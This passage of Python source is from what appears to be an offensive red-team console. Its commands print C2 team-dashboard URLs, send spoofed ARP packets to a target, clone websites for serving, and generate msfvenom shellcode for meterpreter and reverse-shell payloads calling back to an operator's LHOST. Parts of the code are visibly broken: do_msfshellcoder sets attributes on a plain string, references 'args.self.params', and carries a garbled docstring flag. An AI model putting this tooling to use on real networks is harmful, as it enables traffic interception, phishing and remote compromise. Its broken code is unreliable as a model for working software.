        1. Changes to the `sessions` directory and executes `download_resources.sh` to download required resources.

        Usage:
            download_resources

        :param line: Not used in this function.
        :type line: str
        :returns: None

        Manual execution:
        1. Runs the `download_resources.sh` script in the `sessions` directory to download necessary resources.

        Dependencies:
        - `download_resources.sh` must be present in the `sessions` directory.

        Example:
            download_resources

        Note:
            - Ensure that the `download_resources.sh` script is present in the `sessions` directory and is executable.
            - After running this command, you can use the `www` command as indicated by the printed message.
        """

        subprocess.run(["./download_resources.sh"], cwd="sessions", check=False)
        print_msg(f"Resources downloaded now you can run command {MAGENTA}www {RESET}")
        return

    @cmd2.with_category("12. Miscellaneous")
    def do_collab_join(self, line):
        """Print the multi-operator collaboration join URL and SSE endpoint.

        Outputs the URL teammates need to open in a browser to connect to the
        shared operator dashboard at /collab/ and the curl command to consume
        the SSE event stream from a terminal.

        Usage:
            ``collab_join``                    — print join URL for current self.params['lhost']/self.params['c2_port']
            ``collab_join alice``              — print URL with operator handle pre-filled
            ``collab_join alice --curl``       — also print the curl SSE command

        :param line: Optional operator handle and flags.
        :type line: str
        :return: None
        """
        parts   = line.split() if line.strip() else []
        handle  = parts[0] if parts and not parts[0].startswith("-") else "operator"
        curl    = "--curl" in parts
        lhost   = self.params['lhost'] or "localhost"
        c2_port = self.params['c2_port'] or 4444
        base    = f"https://{self.params['lhost']}:{self.params['c2_port']}"
        ui_url  = f"{base}/collab/?operator={handle}"
        sse_url = f"{base}/collab/stream?operator={handle}"
        print_msg(f"Team dashboard : {ui_url}")
        print_msg(f"SSE stream     : {sse_url}")
        print_msg(f"Publish event  : POST {base}/collab/publish")
        print_msg(f"Operator list  : GET  {base}/collab/operators")
        print_msg(f"Target locks   : GET  {base}/collab/locks")
        if curl:
            print_msg(f"curl --insecure -N '{sse_url}' | jq .")

    @cmd2.with_category("12. Miscellaneous")
    def do_kick(self, line):
        """
        Handles the process of sending a spoofed ARP packet to a specified IP address with a given MAC address.

        This function performs the following steps:
        1. Executes a command to list current ARP entries and prints the IP and MAC addresses.
        2. Prompts the user to input the target IP and MAC address in a specified format.
        3. Parses the provided input to extract the IP and MAC addresses.
        4. Sets up default values for the gateway IP, local MAC address, and network interface.
        5. Creates an ARP packet with the specified target IP and MAC address.
        6. Sends the ARP packet using the specified network interface.
        7. Prints a confirmation message indicating that the spoofing packet has been sent.

        Args:
            line (str): Input line for the command, which is not used directly in this function.

        Raises:
            Exception: If any error occurs during the execution of the function.
        """
        try:
            check_sudo()
            command="""sudo arp -a | awk '{print "IP: " $2 " MAC: " $4}'"""
            print_msg(command)
            self.cmd(command)
            choice = input(f"    {CYAN}[!] Set up ip and mac Example (IP: (192.168.1.100) MAC: de:ad:be:ef:00:00): {RESET}")
            target_ip, target_mac = parse_ip_mac(choice)
            if target_ip and target_mac:
                print_msg(f"IP: {target_ip}, MAC: {target_mac}")
            gateway_ip = "192.168.1.1"
            my_mac = "00:11:22:33:44:55"
            print_msg("Available Interfaces: ")
            command = "ip link show | grep -E '^[0-9]+: ' | awk -F': ' '{print $2}'"
            self.cmd(command)
            choice = input("    [!] Enter the interface to use (Default: wlp2s0): ")
            if not choice:
                iface = "wlp2s0"
            else:
                iface = choice

            packet = create_arp_packet(my_mac, gateway_ip, target_ip, target_mac)
            send_packet(packet, iface)
            print_msg(f"Sent spoofing packet to {target_ip} with MAC {target_mac}")

        except Exception as e:
            print_error(f"Error: {e}")

    @cmd2.with_category("12. Miscellaneous")
    def do_qa(self, line):
        """
        Exits the application quickly without confirmation.

        This function performs the following tasks:
        1. Prints an exit message with formatting.
        2. Terminates the `tmux` session named `lazyown_sessions` if it exists.
        3. Kills all running `openvpn` processes.
        4. Exits the program with a status code of 0.

        Usage:
            qa

        :param line: This parameter is not used in the function but is included for consistency with other command methods.
        :type line: str
        :returns: None

        Manual execution:
            1. The command `tmux kill-session -t lazyown_sessions 2>/dev/null` is executed to kill the tmux session named `lazyown_sessions`, suppressing errors if the session does not exist.
            2. The command `killall openvpn 2>/dev/null` is executed to terminate all running `openvpn` processes, suppressing errors if no such processes are found.
            3. The program is exited with a status code of 0 using `sys.exit(0)`.

        Dependencies:
            - The function relies on `tmux`, `killall`, and `sys` to perform the exit operations.

        Example:
            qa
            # This will print an exit message, terminate the tmux session and openvpn processes, and exit the program.

        Note:
            Ensure that `tmux` and `openvpn` are installed and running for their respective commands to have an effect.
        """
        print_error(f"Exit {BG_BLACK}[*]{RESET}")
        self.cmd("tmux kill-session -t lazyown_sessions 2>/dev/null")
        self.cmd("killall openvpn 2>/dev/null")
        self.cmd("killall openvpn 2>/dev/null")
        self.cmd("killall openvpn 2>/dev/null")
        self.cmd("killall openvpn 2>/dev/null")
        sys.exit(0)

    @cmd2.with_category("12. Miscellaneous")
    def do_clock(self, line):
        """
        Displays the current date and time, and runs a custom shell script.

        This function performs the following actions:
        1. Constructs a command to get the current date and time in a specified format.
        2. Uses `figlet` to display the current date and time in a large ASCII text format.
        3. Runs a custom shell script (`cal.sh`) to display additional information or perform further actions related to the clock.

        Usage:
            clock

        :param line: This parameter is not used in the function.
        :type line: str
        :returns: None

        Manual execution:
        To manually use this function:
        1. Ensure that `figlet` is installed on your system for displaying text in large ASCII format.
        2. Make sure `cal.sh` exists in the `modules` directory and is executable.
        3. Run the function to see the current date and time displayed in large ASCII text, followed by the execution of `cal.sh`.

        Note: The function sets the terminal color to white before displaying the date and time, then sets it to green before running the `cal.sh` script. Finally, it resets the terminal color.

        Dependencies:
        - `figlet`: For displaying text in large ASCII format.
        - `cal.sh`: A custom shell script located in the `modules` directory.
        """

        cmd = """
        # Gets current date and time in desired format
        current_date=$(date +"%Y-%m-%d")
        current_time=$(date +"%H:%M:%S")
        # Displays date and time with figlet
        figlet "$current_date"  | lolcat
        figlet "$current_time"  | lolcat
        """
        print_msg(WHITE)
        self.cmd(cmd)
        print_msg(GREEN)
        self.cmd("./modules/cal.sh | lolcat")
        print_msg(RESET)
        time.sleep(3)
        self.cmd("modules/eegg.sh")
        self.cmd("clear")
        return

    @cmd2.with_category("12. Miscellaneous")
    def do_gencert(self, line):
        """
        Generates a certificate authority (CA), client certificate, and client key.

        Returns:
            str: Paths to the generated CA certificate, client certificate, and client key.
        """
        generate_certificates()
        self.cmd("mv *.pem sessions")
        return

    @cmd2.with_category("12. Miscellaneous")
    def do_load_session(self, line):
        """
        Load the session from the sessionLazyOwn.json file and display the status of various parameters.

        This command reads the sessionLazyOwn.json file from the sessions directory and displays the status
        of parameters, credentials, hashes, notes, plan, id_rsa, implants, and redop.

        :param line: Additional arguments (not used in this command)
        """
        session_file_path = os.path.join('sessions', 'sessionLazyOwn.json')

        try:
            with open(session_file_path) as file:
                session_data = json.load(file)

            params_count = len(session_data.get('params', {}))
            credentials_count = len(session_data.get('credentials', []))
            hashes_count = len(session_data.get('hashes', []))
            notes_status = 'LOADED' if 'notes' in session_data else 'NOT LOADED'
            plan_status = 'LOADED' if 'plan' in session_data else 'NOT LOADED'
            id_rsa_count = len(session_data.get('id_rsa', []))
            implants_count = len(session_data.get('implants', []))
            redop_status = 'LOADED' if 'redop' in session_data else 'NOT LOADED'

            timestamp = session_data.get('timestamp', '')

            if timestamp:
                dt_object = datetime.strptime(timestamp, '%Y%m%d%H%M%S')
                formatted_date_time = dt_object.strftime('%Y-%m-%d %H:%M:%S')
            else:
                formatted_date_time = 'N/A'

            print_msg(f"N° Params {params_count} [LOADED][OK]")
            print_msg(f"N° Credentials {credentials_count} [LOADED][OK]")
            print_msg(f"N° Hashes {hashes_count} [LOADED][OK]")
            print_msg(f"N° Id_rsa {id_rsa_count} [LOADED][OK]")
            print_msg(f"N° Implants {implants_count} [LOADED][OK]")
            print_msg(f"Notes [{notes_status}][OK]")
            print_msg(f"Plan [{plan_status}][OK]")
            print_msg(f"RedTeam operation [{redop_status}][OK]")
            print_msg(f"Start Operation: {formatted_date_time}")


        except FileNotFoundError:
            print_error(f"Error: The file {session_file_path} does not exist.")
        except json.JSONDecodeError:
            print_error(f"Error: The file {session_file_path} is not a valid JSON file.")
        except Exception as e:
            print_error(f"An unexpected error occurred: {e}")

    @cmd2.with_category("12. Miscellaneous")
    def do_clone_site(self, line):
        """Clone a website and serve the files in sessions/{url_cloned}.
        Args:
            line (str): input line that url to clone

        Returns:
            None
        """
        if not line:
            url = self.params['url']
        else:
            url = line.strip()
        useragent = "some user agent"
        url_cloned = url.replace("https://", "").replace("http://", "").replace("/", "_").replace(".", "_")
        session_path = f"sessions/{url_cloned}"

        if os.path.isdir(session_path):
            for filename in glob.glob(os.path.join(session_path, "*")):
                if os.path.isdir(filename):
                    shutil.rmtree(filename)
                else:
                    os.remove(filename)
        else:
            os.makedirs(session_path)

        print_msg("Cloning website: " + url)
        try:
            web_request = requests.get(url, headers={'User-Agent': useragent}, verify=False)
            if web_request.status_code != 200 or len(web_request.content) < 1:
                print_error("Unable to clone the site. Status Code: {}".format(web_request.status_code))
                return

            with open(os.path.join(session_path, "index.html"), 'wb') as fh:
                fh.write(web_request.content)

        except requests.ConnectionError:
            print_error("Unable to clone website due to connection issue (are you connected to the Internet?), writing a default one for you...")
            with open(os.path.join(session_path, "index.html"), "w") as fh:
                fh.write("<head></head><html><body>It Works!</body></html>")

        if os.path.isfile(os.path.join(session_path, "index.html")):
            print_msg("Site cloned successfully.")

    @cmd2.with_category("12. Miscellaneous")
    def do_msfshellcoder(self, line):
        """
        Generate shellcode in C format using msfvenom for either a custom command or a reverse shell payload.
        This command supports both direct argument input and interactive mode. It uses self.params for default
        values (self.params['lhost'], lport, etc). Output is saved to sessions/ as a .txt file in C array format.
        Args:
            --payload (-p): MSF payload (e.g., windows/x64/meterpreter/reverse_tcp).
            --command (-c): Custom command to encode into shellcode (e.g., 'whoami').
            --self.params['lhost'] (-H): Local IP for reverse shells.
            --lport (-P): Local port for reverse shells.
            --os (-o): Target OS: 'windows' or 'linux'.
            --arch: Target architecture: 'x86' or 'x64' (default: x64).
        Outputs:
            Saves shellcode to ./sessions/shellcode_*.txt in C format.
            Uses self.cmd() to run system commands and self.display_toastr() for UI feedback.
        Examples:
            msfshellcoder -c "calc.exe" --os windows
            msfshellcoder -p linux/x64/shell_reverse_tcp -H 10.0.0.5 -P 4444
            msfshellcoder  # Launch interactive mode
        """
        # Check if msfvenom is available
        if not is_binary_present("msfvenom"):
            self.display_toastr("msfvenom not found. Installing Metasploit Framework...", type="warning")
            self.cmd("sudo apt-get update -y")
            self.cmd("sudo apt-get install -y metasploit-framework")
            if not is_binary_present("msfvenom"):
                self.display_toastr("msfvenom installation failed. Aborting.", type="error")
                return


        args = line

        if not line:
            self.display_toastr("No arguments provided. Switching to interactive mode.", type="info")
            choice = input("Generate (1) reverse shell or (2) custom command? [1/2]: ").strip()
            if choice == "2":
                cmd_input = input("Enter command to shellcode: ").strip()
                target_os = input("Target OS (windows/linux): ").strip().lower()
                arch = input("Architecture (x86/x64) [x64]: ").strip() or "x64"
                lhost = input(f"LHOST [{self.params['lhost']}]: ").strip() or self.params['lhost']
                lport = input(f"LPORT [{self.params['lport']}]: ").strip() or self.params['lport']
                try:
                    lport = int(lport)
                except ValueError:
                    lport = self.params['lport']
                args.command = cmd_input
                args.os = target_os
                args.arch = arch
                args.lhost = self.params['lhost']
                args.lport = lport
                args.payload = None
            else:
                args.payload = input("Payload (default: windows/x64/meterpreter/reverse_tcp): ").strip()
                args.lhost = input(f"LHOST [{self.params['lhost']}]: ").strip() or self.params['lhost']
                args.lport = input(f"LPORT [{self.params['lport']}]: ").strip() or self.params['lport']
                try:
                    args.lport = int(args.lport)
                except ValueError:
                    args.lport = self.params['lport']
                if not args.payload:
                    args.payload = "windows/x64/meterpreter/reverse_tcp"
        else:
            # Use defaults from params if not provided
            args.lhost = args.self.params['lhost'] or self.params['lhost']
            args.lport = args.lport or self.params['lport']
            if not args.lport:
                self.display_toastr("LPORT is required.", type="error")
                return

        # Create sessions directory
        self.cmd("mkdir -p sessions")

        # Build payload based on input
        if args.command:
            if not args.os:
                self.display_toastr("OS is required when using --command.", type="error")
                return

            os_key = "win" if args.os.startswith("win") else "lin"

            if os_key == "win":
                if args.arch == "x86":
                    payload = "windows/exec"
                    cmd_opt = f"CMD='{args.command}'"
                else:
                    payload = "windows/x64/exec"
                    cmd_opt = f"CMD='{args.command}'"
            else:  # linux
                payload = "cmd/unix/reverse_bash" if "reverse" in args.command else "cmd/unix/generic"
                if "reverse" in args.command:
                    # Assume it's a reverse shell command
                    cmd_opt = ""
                else:
                    cmd_opt = f"CMD='{args.command}'"

            # Build msfvenom command
            if os_key == "win" and "exec" in payload:
                msf_cmd = f'msfvenom -p {payload} {cmd_opt} -f c -o sessions/shellcode_cmd_{args.os}_{args.arch}.txt'
            else:
                # For bash or generic commands
                msf_cmd = f'msfvenom -p {payload} LHOST={args.self.params['lhost']} LPORT={args.lport} -f c -o sessions/shellcode_cmd_{args.os}_{args.arch}.txt'

            output_file = f"sessions/shellcode_cmd_{args.os}_{args.arch}.txt"
            desc = f"Custom command: {args.command[:50]}..."

        elif args.payload:
            payload = args.payload
            msf_cmd = f'msfvenom -p {payload} LHOST={args.self.params['lhost']} LPORT={args.lport} -f c -o sessions/shellcode_{payload.replace("/", "_")}_{args.self.params['lhost']}_{args.lport}.txt'
            output_file = f"sessions/shellcode_{payload.replace('/', '_')}_{args.self.params['lhost']}_{args.lport}.txt"
            desc = f"Reverse shell: {payload}"
        else:
            self.display_toastr("Either --payload or --command is required.", type="error")
            return

        # Execute msfvenom
        self.display_toastr(f"Generating shellcode: {desc}", type="info")
        self.cmd(msf_cmd)

        # Verify and notify
        if os.path.exists(output_file):
            self.display_toastr(f"Shellcode successfully generated: {output_file}", type="info")
        else:
            self.display_toastr("Failed to generate shellcode. Check msfvenom output.", type="error")


import utils as _lazy_utils

for _lazy_name in dir(_lazy_utils):
    if not _lazy_name.startswith('_'):
        globals().setdefault(_lazy_name, getattr(_lazy_utils, _lazy_name))
del _lazy_utils, _lazy_name


def __getattr__(name: str):
    """Fall back to ``utils`` for bare-name references used by migrated commands."""
    import utils as _utils
    try:
        return getattr(_utils, name)
    except AttributeError:
        raise AttributeError(f"module {__name__!r} has no attribute {name!r}") from None
